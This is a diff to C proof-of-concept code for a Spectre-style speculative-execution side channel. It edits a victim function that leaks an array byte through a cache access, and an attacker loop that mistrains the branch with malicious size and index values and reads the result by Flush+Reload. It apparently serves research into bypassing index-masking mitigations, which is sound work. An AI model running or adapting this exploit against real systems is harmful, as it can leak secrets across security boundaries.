@@ -65,45 +65,18 @@ uint8_t* array_init(){
     return array;
 }
 
-static void *realloc_wrapper(uint8_t** ptr, size_t old_size, size_t new_size){
-
-    _mm_clflush(&old_size);
-    _mm_clflush(&new_size);
-    _mm_mfence();
-    _mm_lfence();
-    //printf("old_size addr: %zu\n", &old_size);
-    if ( new_size >= old_size / 2){
-        if(new_size <= old_size){
-            return *ptr;
-        }
-        else{
-            // printf("Wrapper: Realloc called: old_size=%zu, new_size=%zu, array addr ptr=%p\n", old_size, new_size, *ptr);
-            *ptr = realloc(*ptr, new_size);
-            return *ptr;
-        }
-    } else {
-        *ptr = realloc(*ptr, new_size);
-        // printf("Realloc called: old_size=%zu, new_size=%zu, array addr ptr=%p\n", old_size, new_size, *ptr);
-        return *ptr;
-    }
-}
 
 uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
-    // uint32_t temp_array_size = size;
-    //printf("temp_array_size addr: %zu\n", &temp_array_size);
-    // *array = realloc_wrapper(array, array_size, size);
-    // printf("Victim funtion: array addr ptr=%p\n", *array);
-
     if (new_size < array_size / 2 || new_size > array_size) {
         uint8_t *old_array = *array;
         *array = realloc(*array, new_size);
         memcpy(*array, old_array, array_size); // move the old content
+    } else {
+        index &= array_index_mask_nospec(index, new_size);
+        uint8_t secret = (*array)[index];
+        _maccess(page + secret * stride);
     }
-    index &= array_index_mask_nospec(index, new_size);
-    uint8_t secret = (*array)[index];
-    _maccess(page + secret * stride);
 
-    // uint8_t transmission = page[secret * stride];
     return NULL;
 }
 
@@ -229,17 +202,15 @@ void attacker_function() {
                 size_t size = csel(malicious_size, safe_size, is_attack);
                 size_t index = csel(malicious_index, safe_index, is_attack);
 
+
                 // The "Flush" part of Flush+Reload
                 // Can be replaced with Prime+Probe
                 // startIndex, stride, N
                 flush_lines(pages, PAGE_SIZE, SYMBOL_CNT);
                 _mm_clflush((void *)&array_size);
-
                 // Ensure clflushes are finished
                 _mm_mfence();
                 _mm_lfence();
-
-                // printf("index: %lu; content: %c\n", index, array[index]);
                 // Call the victim function and prevent compiler optimizations
                 _no_opt(victim_function(&array, pages, index, PAGE_SIZE, size));
             }
